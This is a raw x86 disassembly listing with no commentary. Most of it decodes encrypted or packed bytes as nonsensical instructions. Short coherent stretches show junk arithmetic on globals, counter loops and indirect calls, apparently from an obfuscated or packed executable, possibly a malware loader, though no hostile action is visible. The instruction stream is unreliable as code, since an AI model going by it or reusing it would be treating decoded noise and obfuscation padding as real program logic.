  403117:	stos   DWORD PTR es:[edi],eax
  403118:	retf   0xaea7
  40311b:	outs   dx,DWORD PTR ds:[esi]
  40311c:	loopne 0x40310f
  40311e:	(bad)  
  40311f:	fisttp DWORD PTR [edx-0x4f]
  403122:	stc    
  403123:	sub    eax,DWORD PTR ds:0x84802cf3
  403129:	xor    BYTE PTR [ecx],bl
  40312b:	add    bl,dh
  40312d:	sti    
  40312e:	cmc    
  40312f:	inc    ecx
  403130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403131:	adc    BYTE PTR [ebp-0x2f81de58],dl
  403137:	sbb    ch,BYTE PTR [edi+0x1c]
  40313a:	xor    eax,0x7c064dde
  40313f:	xor    DWORD PTR [edi+0x1f],edi
  403142:	enter  0xb69,0x3c
  403146:	push   0x2a395d01
  40314b:	xchg   esi,eax
  40314c:	pushf  
  40314d:	and    DWORD PTR [edi+0x6],edx
  403150:	cmp    eax,0x1768b6c
  403155:	retf   0x1154
  403158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403159:	sub    eax,0x44ec322c
  40315e:	inc    ebp
  40315f:	pusha  
  403160:	int    0x72
  403162:	sbb    al,0x99
  403164:	dec    edi
  403165:	xchg   ecx,eax
  403166:	mov    bh,0xa7
  403168:	push   esi
  403169:	mov    bh,0x18
  40316b:	(bad)  
  40316f:	(bad)  
  403170:	dec    esi
  403171:	xchg   ecx,eax
  403172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403173:	inc    eax
  403174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403175:	cli    
  403176:	and    dh,dl
  403178:	pop    esp
  403179:	ss popa 
  40317b:	push   edi
  40317c:	and    al,0x20
  40317e:	or     ecx,DWORD PTR [edi-0x51]
  403181:	in     al,0x15
  403183:	jbe    0x4031a9
  403185:	cwde   
  403186:	xor    eax,0xfc098f67
  40318b:	jp     0x4031e7
  40318d:	loopne 0x40312f
  40318f:	pop    ebp
  403190:	dec    esp
  403191:	mov    ch,0xb3
  403193:	je     0x4031a8
  403195:	jp     0x403166
  403197:	sub    bh,ah
  403199:	in     eax,0x23
  40319b:	mov    ds:0x62c40de,eax
  4031a0:	pop    es
  4031a1:	mov    ch,0x39
  4031a3:	adc    al,0x18
  4031a5:	sbb    dh,dl
  4031a7:	aaa    
  4031a8:	ror    ebp,1
  4031aa:	fwait
  4031ab:	sbb    eax,0xb4eabc6c
  4031b0:	xor    DWORD PTR [ebx+0xce20c9a],esi
  4031b6:	add    al,0x9d
  4031b8:	inc    edi
  4031b9:	push   esi
  4031ba:	add    ebp,esp
  4031bc:	cli    
  4031bd:	jne    0x4031c9
  4031bf:	pop    ebp
  4031c0:	xchg   ebp,eax
  4031c1:	push   ds
  4031c2:	dec    esi
  4031c3:	popa   
  4031c4:	dec    edi
  4031c5:	neg    BYTE PTR [esi+0x442929e6]
  4031cb:	xor    al,0xfd
  4031cd:	dec    ebp
  4031ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031cf:	push   ecx
  4031d0:	(bad)  
  4031d1:	cwd    
  4031d3:	js     0x4031a4
  4031d5:	cwde   
  4031d6:	(bad)  
  4031d7:	fld    DWORD PTR [edi]
  4031d9:	es xchg ebx,eax
  4031db:	xchg   edx,eax
  4031dc:	lods   al,BYTE PTR cs:[esi]
  4031de:	pop    ebp
  4031df:	jge    0x4031e3
  4031e1:	add    BYTE PTR [edi-0x28],dl
  4031e4:	(bad)  
  4031e5:	outs   dx,DWORD PTR ds:[esi]
  4031e6:	sub    BYTE PTR [edi*8+0x47c4ffaa],dl
  4031ed:	sub    BYTE PTR fs:[edi-0x28bedc1a],ch
  4031f4:	push   ebp
  4031f5:	xchg   cl,bl
  4031f7:	mov    fs,WORD PTR [eax]
  4031f9:	push   ds
  4031fa:	xchg   esp,eax
  4031fb:	outs   dx,BYTE PTR ds:[esi]
  4031fc:	xor    bh,cl
  4031fe:	xchg   ecx,eax
  4031ff:	cmp    esp,DWORD PTR [ecx+edx*4-0x15256d82]
  403206:	sbb    al,0xf9
  403208:	and    dh,al
  40320a:	adc    BYTE PTR [esi+0x23],dh
  40320d:	rcl    DWORD PTR [ecx-0x258ee1e2],cl
  403213:	test   eax,0xcd487c5a
  403218:	call   DWORD PTR [ebx-0x3df29b1d]
  40321e:	int    0xbf
  403220:	adc    DWORD PTR [edi+0x10],0xffffffa4
  403224:	fisub  DWORD PTR [edx-0x10b0c737]
  40322a:	xchg   edi,eax
  40322b:	loope  0x403232
  40322d:	(bad)  
  40322e:	or     al,0x4e
  403230:	ficomp WORD PTR [esi-0x4f36410]
  403236:	jae    0x403280
  403238:	mov    dh,0xb9
  40323a:	aad    0xd6
  40323c:	xchg   DWORD PTR [edi],esi
  40323e:	jle    0x4031ea
  403240:	test   al,0xd2
  403242:	daa    
  403243:	push   ss
  403244:	pop    ebx
  403245:	jb     0x4032b6
  403247:	mov    dh,0xdd
  403249:	push   esi
  40324a:	jmp    FWORD PTR [edi]
  40324c:	dec    edx
  40324d:	mov    edx,0x8d30cd3
  403252:	pop    ebx
  403253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403254:	imul   esi,DWORD PTR [ebp+0x23],0x39f92dc9
  40325b:	push   0x29
  40325d:	lea    edx,[edi+0x61]
  403260:	mov    bh,0x30
  403262:	dec    eax
  403263:	into   
  403264:	push   edi
  403265:	xchg   esi,eax
  403266:	imul   DWORD PTR [edx-0x62]
  403269:	mov    DWORD PTR [esi-0x70],edi
  40326c:	hlt    
  40326d:	dec    ecx
  40326e:	(bad)  
  40326f:	and    al,0x31
  403271:	xor    cl,ch
  403273:	loope  0x4032ec
  403275:	add    bh,BYTE PTR [eax+0x8a38]
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x43457b,0x434543
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43458f
  403297:	xor    ecx,DWORD PTR ds:0x4344eb
  40329d:	mov    DWORD PTR ds:0x43458f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43457f
  4032ac:	xor    DWORD PTR ds:0x434503,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43458f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4345bf
  4032c1:	mov    DWORD PTR ds:0x43458f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43458f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43460b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     dh,al
  4032f3:	adc    DWORD PTR [esi],ecx
  4032f5:	mov    eax,0x7e7e100b
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x40335f
  4032ff:	stos   DWORD PTR es:[edi],eax
  403300:	or     al,0x74
  403302:	cmp    BYTE PTR [edx-0x7a],bh
  403305:	fld    QWORD PTR [ecx+0x6dfcc563]
  40330b:	arpl   WORD PTR [edi+ebx*1],di
  40330e:	lock lods al,BYTE PTR ds:[esi]
  403310:	gs iret 
  403312:	mov    eax,0xda3244ce
  403317:	jb     0x40334e
  403319:	sub    DWORD PTR ds:0xc3bf1edc,ebp
  40331f:	pushf  
  403320:	leave  
  403321:	dec    ecx
  403322:	gs jle 0x4032e0
  403325:	mov    edi,0xfce49b38
  40332a:	dec    ebx
  40332b:	pop    ds
  40332c:	add    eax,0x728d60db
  403331:	retf   0xad31
  403334:	mov    ?,edi
  403336:	xchg   esi,eax
  403337:	dec    ebx
  403338:	in     eax,dx
  403339:	fild   WORD PTR [edi-0x5964bbcd]
  40333f:	stos   BYTE PTR es:[edi],al
  403340:	inc    edi
  403341:	jp     0x4032e2
  403343:	lahf   
  403344:	jmp    0x4033b4
  403346:	add    eax,0x1e59f63e
  40334b:	xchg   edx,eax
  40334c:	pop    esi
  40334d:	jmp    0x4033c5
  40334f:	sbb    eax,0x2b825068
  403354:	push   esp
  403355:	add    BYTE PTR [esi-0x78c383d9],bh
  40335b:	cmp    eax,0xa545e683
  403360:	xchg   BYTE PTR [ecx],ah
  403362:	pusha  
  403363:	xor    BYTE PTR [esi-0x6c0aa858],0x34
  40336a:	out    dx,al
  40336b:	ret    
  40336c:	xor    dh,bh
  40336e:	shl    BYTE PTR [ebp-0x5f402a18],0x2f
  403375:	xchg   esp,eax
  403376:	cmc    
  403377:	fidivr WORD PTR [ecx-0x50aecea4]
  40337d:	loope  0x403327
  40337f:	jbe    0x403328
  403381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403382:	out    0xa5,eax
  403384:	pop    esi
  403385:	adc    dl,BYTE PTR [ecx-0xc]
  403388:	xor    ah,dh
  40338a:	hlt    
  40338b:	inc    esi
  40338c:	or     ebx,edi
  40338e:	icebp  
  40338f:	add    esi,esi
  403391:	clc    
  403392:	push   ebp
  403393:	xchg   esp,eax
  403394:	int    0xb4
  403396:	add    BYTE PTR [edx],al
  403398:	out    0x9b,al
  40339a:	cmp    ah,bl
  40339c:	push   ecx
  40339d:	inc    edi
  40339e:	jmp    0x1532dadc
  4033a3:	mov    al,al
  4033a5:	sbb    al,0xaa
  4033a7:	pop    ds
  4033a8:	add    bl,BYTE PTR [edi]
  4033aa:	xchg   ecx,eax
  4033ab:	jmp    0x5aee:0x919e921e
  4033b2:	push   sp
  4033b4:	sbb    DWORD PTR [eax+0x7b6e88ae],ecx
  4033ba:	mov    edi,0xeca1f75f
  4033bf:	inc    edi
  4033c0:	sar    BYTE PTR [ebx],0xe2
  4033c3:	xchg   esi,eax
  4033c4:	fistp  QWORD PTR [edx+0x54]
  4033c7:	jp     0x4033fc
  4033c9:	inc    edi
  4033ca:	mov    ch,0x2d
  4033cc:	es inc eax
  4033ce:	test   eax,0x3abf2b7
  4033d3:	loop   0x4033c2
  4033d5:	retf   
  4033d6:	mov    WORD PTR [edx-0x32c3e5f8],gs
  4033dc:	push   ds
  4033dd:	lahf   
  4033de:	inc    ebx
  4033df:	push   0x917d3413
  4033e4:	mov    ds:0x29f8a2f9,al
  4033e9:	into   
  4033ea:	jns    0x403441
  4033ec:	push   es
  4033ed:	cmc    
  4033ee:	frstor [eax]
  4033f0:	sar    BYTE PTR [eax-0x61],0x76
  4033f4:	sub    ecx,ebx
  4033f6:	xor    esi,DWORD PTR ss:[edi]
  4033f9:	adc    al,BYTE PTR cs:[eax-0x19]
  4033fd:	inc    edi
  4033fe:	sbb    eax,edx
  403400:	in     eax,0xec
  403402:	cs (bad) 
  403404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403405:	or     al,0xc2
  403407:	push   ebp
  403408:	aaa    
  403409:	mov    bl,0x2d
  40340b:	mov    dh,0x97
  40340d:	push   eax
  40340e:	sub    BYTE PTR [edi-0x5b],bl
  403411:	inc    ebx
  403412:	jg     0x40343c
  403414:	push   cs
  403415:	xchg   edi,eax
  403416:	out    dx,al
  403417:	or     eax,0x10476e6e
  40341c:	cmc    
  40341d:	retf   0x8e10
  403420:	pop    ss
  403421:	stos   BYTE PTR es:[edi],al
  403422:	lahf   
  403423:	dec    edx
  403424:	in     eax,dx
  403425:	xchg   ebp,eax
  403426:	test   BYTE PTR [esi-0xe6be71f],dl
  40342c:	dec    ebx
  40342d:	adc    dh,al
  40342f:	or     BYTE PTR [esi+eiz*2-0x71],ch
  403433:	shl    bl,cl
  403435:	pop    esi
  403436:	sub    BYTE PTR [eax],al
  403438:	adc    al,BYTE PTR [ebx+0x1a]
  40343b:	mov    DWORD PTR [edx],esp
  40343d:	adc    DWORD PTR [ecx+ebp*4],ebx
  403440:	mov    gs,WORD PTR [esi+0x4]
  403443:	dec    edi
  403444:	mov    ds:0xa77d83f8,al
  403449:	dec    esi
  40344a:	cmp    ebx,DWORD PTR [ebp-0x2b]
  40344d:	out    0xe1,eax
  40344f:	retf   
  403450:	sti    
  403451:	add    al,0xbd
  403453:	in     eax,0x78
  403455:	imul   eax,DWORD PTR [esi-0x67],0x25
  403459:	aaa    
  40345a:	retf   
  40345b:	scas   eax,DWORD PTR es:[edi]
  40345c:	mov    dl,0x7f
  40345e:	sub    dl,dh
  403460:	mov    al,ds:0x7488fff9
  403465:	sar    BYTE PTR [edx],0xc0
  403468:	mov    ds:0x5cd06244,al
  40346d:	arpl   bx,cx
  40346f:	ins    DWORD PTR es:[di],dx
  403471:	and    eax,0xce9665
  403476:	cmp    edx,esp
  403478:	dec    ebx
  403479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40347a:	mov    ch,cl
  40347c:	dec    ebp
  40347d:	xchg   edi,eax
  40347e:	sub    DWORD PTR [ecx-0x5782406],ebp
  403484:	sub    dh,ah
  403486:	fist   DWORD PTR [ecx+ebp*8]
  403489:	(bad)  
  40348a:	cmc    
  40348b:	sub    al,0x19
  40348e:	inc    edx
  40348f:	(bad)  cs:[edx-0x77]
  403493:	clc    
  403494:	dec    ebx
  403495:	out    0x70,al
  403497:	lea    eax,[ebx+0x744aa6fa]
  40349d:	push   ds
  40349e:	popf   
  40349f:	cmp    ch,BYTE PTR [edx+eax*4-0x26]
  4034a3:	or     al,0x98
  4034a5:	aaa    
  4034a6:	addr16 gs (bad) 
  4034a9:	call   0x6825e2e5
  4034ae:	test   DWORD PTR [ebx-0x494e743f],ecx
  4034b4:	or     ch,BYTE PTR [edi]
  4034b6:	xchg   esp,eax
  4034b7:	lds    ecx,FWORD PTR [ecx]
  4034b9:	enter  0xad0a,0xf9
  4034bd:	fsubp  st(7),st
  4034bf:	mov    DWORD PTR [ecx],esi
  4034c1:	ja     0x4034f6
  4034c3:	rol    BYTE PTR ds:0x7112adba,cl
  4034c9:	and    ch,BYTE PTR [esp+ecx*1-0x78da05d5]
  4034d0:	nop
  4034d1:	mov    ecx,0xd2dc1304
  4034d6:	sbb    al,0xba
  4034d8:	mov    cl,0xea
  4034da:	test   BYTE PTR [edx],al
  4034dc:	(bad)  
  4034dd:	ret    
  4034de:	push   eax
  4034df:	lods   al,BYTE PTR ds:[esi]
  4034e0:	icebp  
  4034e1:	(bad)  
  4034e2:	pop    esp
  4034e3:	sbb    BYTE PTR [eax+eax*4],ch
  4034e6:	jmp    0xc2df:0xb6608f39
  4034ed:	mov    bh,0xe0
  4034ef:	outs   dx,BYTE PTR ds:[esi]
  4034f0:	sbb    dl,ch
  4034f2:	popa   
  4034f3:	sub    BYTE PTR [edx+0x52],bh
  4034f6:	bound  ecx,QWORD PTR [ebx-0x3d1d7520]
  4034fc:	mov    eax,0x796bca8c
  403501:	push   cs
  403502:	jne    0x4034c3
  403504:	fisubr DWORD PTR [eax]
  403506:	add    eax,0xf56ee416
  40350b:	push   cs
  40350c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40350d:	xchg   cl,ch
  40350f:	lds    esp,FWORD PTR [edi+ebp*4+0x564cf4c1]
  403516:	cdq    
  403517:	cli    
  403518:	cwde   
  403519:	hlt    
  40351a:	in     al,0x4d
  40351c:	xchg   ebp,eax
  40351d:	outs   dx,DWORD PTR ds:[esi]
  40351e:	in     eax,0x31
  403520:	and    al,0x29
  403522:	mov    ah,BYTE PTR [ebx+0x7aa1f5cc]
  403528:	aam    0x46
  40352a:	adc    eax,0xb11fe2bb
  40352f:	leave  
  403530:	sub    al,0x8c
  403532:	out    0x91,al
  403534:	xchg   esi,eax
  403535:	add    cl,0x3f
  403538:	fidivr DWORD PTR [edx-0x60]
  40353b:	aas    
  40353c:	xor    al,0x61
  40353e:	daa    
  40353f:	dec    eax
  403540:	mov    dh,0xee
  403542:	leave  
  403543:	pop    ds
  403544:	jo     0x4035c1
  403546:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403548:	stos   BYTE PTR es:[edi],al
  403549:	inc    ecx
  40354a:	pop    ebp
  40354b:	sub    dl,bh
  40354d:	fwait
  40354e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40354f:	ss jecxz 0x4035c4
  403552:	inc    edx
  403553:	jmp    0x403554
  403555:	div    DWORD PTR [eax-0x5]
  403558:	(bad)  
  403559:	and    bh,BYTE PTR [ecx-0x6290f9a0]
  40355f:	lock js 0x403578
  403562:	sbb    al,0x69
  403564:	call   0x423d:0xfef5dc0e
  40356b:	es into 
  40356d:	scas   eax,DWORD PTR es:[edi]
  40356e:	adc    eax,0x40446b50
  403573:	adc    BYTE PTR [ecx-0x35b777a],ch
  403579:	xchg   esp,eax
  40357a:	mov    es,WORD PTR [ecx-0x695497eb]
  403580:	add    ebx,ecx
  403582:	xchg   ebx,ebx
  403584:	push   0xb04c1727
  403589:	xchg   dl,bl
  40358b:	es xchg edi,eax
  40358d:	mov    bl,0xe3
  40358f:	sar    DWORD PTR [esi],1
  403591:	out    0x64,al
  403593:	cmp    BYTE PTR [ebx-0x36b6bc55],bh
  403599:	dec    eax
  40359a:	xchg   edx,eax
  40359b:	xchg   ebp,eax
  40359c:	imul   ecx,DWORD PTR [edi-0x6f],0x3975405c
  4035a3:	jo     0x40352f
  4035a5:	pcmpgtw mm7,QWORD PTR [ecx]
  4035a8:	fwait
  4035a9:	add    esp,eax
  4035ab:	cli    
  4035ac:	xor    BYTE PTR [edi-0x25ec7fcd],dh
  4035b2:	cmp    DWORD PTR [ecx+0x71310c59],0x7a
  4035b9:	daa    
  4035ba:	sub    al,0xb2
  4035bc:	stc    
  4035bd:	push   cs
  4035be:	icebp  
  4035bf:	and    esp,DWORD PTR [ebx]
  4035c1:	stos   DWORD PTR es:[edi],eax
  4035c2:	(bad)  
  4035c3:	xchg   ebp,eax
  4035c4:	sbb    eax,0xecf1a095
  4035c9:	or     DWORD PTR [ecx-0x29],0xeb4dc850
  4035d0:	dec    ecx
  4035d1:	gs and cl,cl
  4035d4:	jg     0x403595
  4035d6:	adc    al,0xf1
  4035d8:	call   0x5e311f54
  4035dd:	mov    bh,0x40
  4035df:	sbb    eax,0x55974cd0
  4035e4:	pop    esi
  4035e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e6:	pop    ebx
  4035e7:	push   edx
  4035e8:	outs   dx,BYTE PTR ds:[esi]
  4035e9:	sub    edi,DWORD PTR [ecx+0x2c]
  4035ec:	imul   edi,DWORD PTR [bx+di+0x70],0x52caffb2
  4035f4:	stc    
  4035f5:	or     DWORD PTR [edi],esp
  4035f7:	mov    esp,0xa273764
  4035fc:	inc    edi
  4035fd:	aaa    
  4035fe:	cs mov eax,0xc4867f16
  403604:	xchg   edi,edx
  403606:	mov    al,0xd6
  403608:	sbb    eax,0xb78dac9a
  40360d:	dec    esp
  40360e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40360f:	and    al,0x15
  403611:	adc    eax,0x23acad69
  403616:	(bad)  
  403617:	fisttp QWORD PTR [ebx]
  403619:	xor    edx,DWORD PTR [ecx+0x7760ab57]
  40361f:	inc    ebp
  403620:	aad    0x39
  403622:	pop    es
  403623:	sbb    ecx,0x28583241
  403629:	xchg   esi,eax
  40362a:	shr    BYTE PTR [eax],1
  40362c:	mov    esp,0xff9edcc4
  403631:	jge    0x40363e
  403633:	sbb    ebx,DWORD PTR [esi-0xf60182d]
  403639:	mov    ecx,0x55c4d55f
  40363e:	push   edi
  40363f:	dec    ecx
  403640:	or     al,0x9a
  403642:	mov    al,0x9b
  403644:	mov    ebx,ds
  403646:	sti    
  403647:	loopne 0x403642
  403649:	sub    bl,BYTE PTR [eax+0x23]
  40364c:	mov    edx,0x7921dfc6
  403651:	fsub   DWORD PTR [edi+0x18f947fd]
  403657:	out    dx,al
  403658:	sbb    al,0x8c
  40365a:	mov    ds:0x5f37c9a8,al
  40365f:	or     BYTE PTR [ecx-0x5368df48],bl
  403665:	xor    esp,DWORD PTR [ecx]
  403667:	mov    esp,0x63ca2a75
  40366c:	mov    ch,0xbb
  40366e:	xlat   BYTE PTR ds:[ebx]
  40366f:	and    DWORD PTR [eax+0x71],ecx
  403672:	(bad)  
  403673:	mov    al,ds:0x6935c7d0
  403678:	xor    al,0xcb
  40367a:	sbb    esi,DWORD PTR [esi+0x6b]
  40367d:	aaa    
  40367e:	jo     0x403627
  403680:	cmp    DWORD PTR [esi-0xe],0x726bd154
  403687:	ret    
  403688:	xor    BYTE PTR [ecx],dh
  40368a:	add    al,0xe2
  40368c:	push   es
  40368d:	icebp  
  40368e:	dec    ecx
  40368f:	inc    eax
  403690:	pop    ebx
  403691:	xor    ch,BYTE PTR [edi+ecx*4]
  403694:	dec    eax
  403695:	mov    esi,DWORD PTR [eax+0x5c]
  403698:	jecxz  0x4036be
  40369a:	jg     0x40370a
  40369c:	das    
  40369d:	inc    eax
  40369e:	fadd   st(5),st
  4036a0:	jmp    0xea47bded
  4036a5:	cmp    dh,BYTE PTR [esi+0x5d116670]
  4036ab:	push   cs
  4036ac:	repnz add eax,DWORD PTR [eax+eax*4+0xf]
  4036b1:	push   edx
  4036b2:	into   
  4036b3:	cdq    
  4036b4:	cli    
  4036b5:	or     al,0xda
  4036b7:	xchg   dl,ch
  4036b9:	sub    eax,0xbf78dbdd
  4036be:	ins    BYTE PTR es:[edi],dx
  4036bf:	inc    ebp
  4036c0:	lds    ebx,FWORD PTR [esi+ebx*4-0x4e7543fe]
  4036c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c8:	pop    ds
  4036c9:	aaa    
  4036ca:	fisub  DWORD PTR [edi-0x6eb39d94]
  4036d0:	imul   edi,DWORD PTR [ebp+0x2e],0x8a2ebf4d
  4036d7:	inc    ebp
  4036d8:	dec    DWORD PTR [ebx+0x4344eb0d]
  4036de:	add    BYTE PTR [ebx],bl
  4036e0:	or     eax,0x434607
  4036e5:	mov    DWORD PTR ds:0x4344eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434613,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4344fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4344f7,0x434607
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434577,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434587,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434587
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434587,ecx
  40373d:	cmp    DWORD PTR ds:0x434587,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434587,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4345cb,0x14
  403779:	cmp    DWORD PTR ds:0x4345cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4345cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4345cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4345cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4345cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4345cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4345cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4344e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4344e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4344e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434749
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4344e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4344e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4344e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4344e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4344e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434587,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43460b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43454f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434543
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43454b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	lea    edi,es:[edi+0x7e1363f9]
  4038c4:	jle    0x40391c
  4038c6:	jns    0x403946
  4038c8:	jle    0x403876
  4038ca:	xlat   BYTE PTR ds:[ebx]
  4038cb:	sbb    DWORD PTR [esi+0x75],0xf3593712
  4038d2:	ror    ebp,cl
  4038d4:	jmp    0x403888
  4038d6:	and    DWORD PTR [ebx+0x3cc5cac],ecx
  4038dc:	cmp    DWORD PTR [ebx-0xb7a8c9c],ecx
  4038e2:	mov    edi,0xba7263a8
  4038e7:	sahf   
  4038e8:	ins    DWORD PTR es:[edi],dx
  4038e9:	fld    st(2)
  4038eb:	pop    esp
  4038ec:	push   0xdfe20b05
  4038f1:	or     eax,0x4a9bde49
  4038f6:	pushf  
  4038f7:	adc    eax,0x4e31a2ef
  4038fc:	inc    ebx
  4038fd:	push   0xe943e348
  403902:	or     esp,DWORD PTR [ecx+0x7a]
  403905:	push   esp
  403906:	enter  0xeeb6,0xa6
  40390a:	xchg   edi,eax
  40390b:	in     eax,dx
  40390c:	adc    ecx,ebx
  40390e:	arpl   WORD PTR [edi+edx*1-0x73],bp
  403912:	int    0x68
  403914:	gs stos BYTE PTR es:[edi],al
  403916:	(bad)  
  403918:	add    ebp,DWORD PTR [edx+0x7ece685c]
  40391e:	jnp    0x40393d
  403920:	jne    0x40395f
  403922:	stc    
  403923:	gs fwait
  403925:	lock aas 
  403927:	cli    
  403928:	push   ecx
  403929:	pop    ebx
  40392a:	dec    ebp
  40392b:	xchg   esi,eax
  40392c:	push   esp
  40392d:	adc    al,0x96
  40392f:	lods   al,BYTE PTR ds:[esi]
  403930:	dec    edx
  403931:	xchg   ebp,eax
  403932:	jo     0x403900
  403934:	adc    esp,DWORD PTR [edi]
  403936:	fwait
  403937:	jmp    0x40399a
  403939:	xchg   BYTE PTR [eax+edi*4],cl
  40393c:	push   0x4fbe8fed
  403941:	popa   
  403942:	mov    ebx,0x7a1450c5
  403947:	(bad)  
  403948:	and    eax,DWORD PTR [edx]
  40394a:	stos   BYTE PTR es:[edi],al
  40394b:	jne    0x403913
  40394d:	out    dx,eax
  40394e:	dec    ebp
  40394f:	loopne 0x4039c3
  403951:	inc    edi
  403952:	call   0x90d9:0xf3de2ff2
  403959:	xchg   ebp,eax
  40395a:	call   0x14048e6a
  40395f:	inc    cl
  403961:	xchg   DWORD PTR [esi-0x6d],ecx
  403964:	outs   dx,BYTE PTR ds:[esi]
  403965:	push   ecx
  403966:	xchg   edx,eax
  403967:	mov    edx,0xb8694f8a
  40396c:	icebp  
  40396d:	dec    ebx
  40396e:	test   DWORD PTR [ebx-0x5b7e3ef4],esi
  403974:	das    
  403975:	mov    WORD PTR [ebx+0x73],ss
  403978:	(bad)  
  403979:	fdiv   st,st(1)
  40397b:	lods   al,BYTE PTR ds:[esi]
  40397c:	xchg   edx,eax
  40397d:	(bad)  
  40397e:	and    al,0x38
  403980:	scas   eax,DWORD PTR es:[edi]
  403981:	sbb    BYTE PTR [esi+0x2b],bh
  403984:	add    al,0x34
  403986:	jae    0x4039f5
  403988:	pop    ds
  403989:	mov    ds:0xbf4004dd,eax
  40398e:	ins    DWORD PTR es:[edi],dx
  40398f:	jle    0x4039c0
  403991:	xor    DWORD PTR ds:0xeb2f0cae,ebp
  403997:	bound  edi,QWORD PTR [edi+esi*8+0x3b95fa59]
  40399e:	dec    ecx
  40399f:	jno    0x4039bb
